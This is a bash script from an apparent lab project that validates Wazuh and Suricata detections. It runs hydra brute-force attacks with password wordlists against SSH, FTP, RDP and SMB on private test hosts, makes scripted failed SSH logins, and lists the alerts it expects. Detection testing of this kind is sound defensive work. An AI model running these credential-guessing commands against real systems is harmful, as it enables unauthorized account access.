#!/bin/bash
###############################################################################
# PHASE 1: SIEM VALIDATION - BRUTE FORCE & AUTHENTICATION ATTACKS
# Cloud Security Project - Kali Linux Attack Scripts
#
# Expected Detections:
#   - Wazuh: Multiple failed login attempts (rule 5712, 5503)
#   - Suricata: ET SCAN Possible SSH Brute Force
#   - Wazuh: PCI DSS 10.2.4, 10.2.5 compliance alerts
###############################################################################

set -e

# =============================================================================
# CONFIGURATION
# =============================================================================
DEBIAN_IP="192.168.1.101"
UBUNTU_IP="192.168.1.102"
WINDOWS_IP="192.168.1.103"

# Wordlists
PASSWORD_LIST="/usr/share/wordlists/rockyou.txt"
SMALL_PASSWORD_LIST="/tmp/small_password_list.txt"

RESULTS_DIR="/root/attack-results/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS_DIR"

echo "========================================================================"
echo "  CLOUD SECURITY PROJECT - PHASE 1: SIEM VALIDATION"
echo "  Attack Category: Brute Force & Authentication Attacks"
echo "  Start Time: $(date)"
echo "========================================================================"

# Create small password list for testing (first 50 passwords)
if [ ! -f "$SMALL_PASSWORD_LIST" ]; then
    echo "[*] Creating small password list for testing..."
    head -n 50 "$PASSWORD_LIST" > "$SMALL_PASSWORD_LIST" 2>/dev/null || \
    echo -e "password\n123456\nadmin\nroot\ntoor\nubuntu\ndebian\n123456789\nqwerty\nletmein\nwelcome\nmonkey\ndragon\nmaster\nhello123" > "$SMALL_PASSWORD_LIST"
fi

# =============================================================================
# ATTACK 2.1: SSH Brute Force against Ubuntu
# =============================================================================
echo ""
echo "[2.1] SSH Brute Force Attack against Ubuntu..."
echo "      Tool: hydra -l ubuntu -P wordlist ssh"
echo "      Expected: Wazuh rule 5712 (SSH brute force), 5503 (Failed login)"
echo "      Duration: ~2 minutes"

# Create a test user list
cat > /tmp/test_users.txt << EOF
root
admin
ubuntu
test
user
EOF

hydra -L /tmp/test_users.txt -P "$SMALL_PASSWORD_LIST" \
      -t 4 -e ns \
      -o "$RESULTS_DIR/01_ssh_bruteforce_ubuntu.txt" \
      ssh://"$UBUNTU_IP" 2>&1 | tee "$RESULTS_DIR/01_ssh_bruteforce_ubuntu_live.log" || true

echo "[2.1] Complete. Waiting 60 seconds for alert aggregation..."
sleep 60

# =============================================================================
# ATTACK 2.2: SSH Brute Force against Debian
# =============================================================================
echo ""
echo "[2.2] SSH Brute Force Attack against Debian..."
echo "      Tool: hydra"
echo "      Expected: Suricata ET SCAN Possible SSH Brute Force"

hydra -L /tmp/test_users.txt -P "$SMALL_PASSWORD_LIST" \
      -t 4 -e ns \
      -o "$RESULTS_DIR/02_ssh_bruteforce_debian.txt" \
      ssh://"$DEBIAN_IP" 2>&1 | tee "$RESULTS_DIR/02_ssh_bruteforce_debian_live.log" || true

echo "[2.2] Complete. Waiting 60 seconds..."
sleep 60

# =============================================================================
# ATTACK 2.3: FTP Brute Force
# =============================================================================
echo ""
echo "[2.3] FTP Brute Force Attack..."
echo "      Tool: hydra -l anonymous -P wordlist ftp"
echo "      Expected: Wazuh FTP authentication failure alerts"

hydra -l anonymous -P "$SMALL_PASSWORD_LIST" \
      -t 4 \
      -o "$RESULTS_DIR/03_ftp_bruteforce.txt" \
      ftp://"$UBUNTU_IP" 2>&1 | tee "$RESULTS_DIR/03_ftp_bruteforce_live.log" || true

echo "[2.3] Complete. Waiting 30 seconds..."
sleep 30

# =============================================================================
# ATTACK 2.4: Manual Failed Login Attempts (generates auth.log entries)
# =============================================================================
echo ""
echo "[2.4] Manual Failed SSH Login Attempts..."
echo "      Method: ssh with wrong passwords"
echo "      Expected: Wazuh rule 5710 (Attempt to login using non-existent user)"

for i in {1..5}; do
    echo "    Attempt $i/5: fakeuser@$UBUNTU_IP"
    sshpass -p "wrongpassword$i" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=5 \
        "fakeuser@$UBUNTU_IP" "whoami" 2>&1 | tee -a "$RESULTS_DIR/04_manual_failed_logins.log" || true
    sleep 2
done

echo "[2.4] Complete. Waiting 30 seconds..."
sleep 30

# =============================================================================
# ATTACK 2.5: SMB/RDP Brute Force against Windows (if ports open)
# =============================================================================
echo ""
echo "[2.5] SMB/RDP Brute Force against Windows 10..."
echo "      Tool: hydra -l administrator -P wordlist rdp"
echo "      Expected: Wazuh Windows security event 4625 (failed logon)"

# First check if RDP is open
if nmap -p 3389 "$WINDOWS_IP" | grep -q "open"; then
    echo "      [+] RDP port 3389 is open, proceeding with attack..."
    
    hydra -l administrator -P "$SMALL_PASSWORD_LIST" \
          -t 2 \
          -o "$RESULTS_DIR/05_rdp_bruteforce.txt" \
          rdp://"$WINDOWS_IP" 2>&1 | tee "$RESULTS_DIR/05_rdp_bruteforce_live.log" || true
    
    echo "[2.5] Complete."
else
    echo "      [-] RDP port 3389 is closed, skipping RDP brute force."
    echo "      [-] Attempting SMB instead..."
    
    hydra -l administrator -P "$SMALL_PASSWORD_LIST" \
          -t 2 \
          -o "$RESULTS_DIR/05_smb_bruteforce.txt" \
          smb://"$WINDOWS_IP" 2>&1 | tee "$RESULTS_DIR/05_smb_bruteforce_live.log" || true
fi

# =============================================================================
# SUMMARY
# =============================================================================
echo ""
echo "========================================================================"
echo "  BRUTE FORCE ATTACKS COMPLETE"
echo "  Results saved to: $RESULTS_DIR"
echo "  End Time: $(date)"
echo ""
echo "  VERIFICATION CHECKLIST:"
echo "  [ ] Wazuh Dashboard: Security Events > Authentication Failures"
echo "  [ ] Filter: rule.id:5712 OR rule.id:5503 OR rule.id:5710"
echo "  [ ] Suricata: grep 'SSH' /var/log/suricata/fast.log"
echo "  [ ] Ubuntu: tail -n 50 /var/log/auth.log"
echo "  [ ] Debian: tail -n 50 /var/log/auth.log"
echo "  [ ] Windows: Event Viewer > Security > 4625 events"
echo "========================================================================"
